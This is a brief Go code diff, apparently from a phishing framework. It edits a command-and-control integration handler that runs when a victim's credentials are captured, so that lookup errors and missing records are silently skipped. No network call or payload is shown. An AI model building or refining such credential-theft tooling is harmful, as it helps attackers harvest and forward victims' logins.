@@ -50,8 +50,8 @@ func (m *C2IntegrationModule) handleCredentialCaptured(ctx context.Context, even
 		return nil
 	}
 	creds, err := m.db.GetCredentials(ev.SessionID)
-	if err != nil {
-		return err
+	if err != nil || creds == nil {
+		return nil
 	}
 	metadata := map[string]string{
 		"phishlet":  ev.PhishletID,
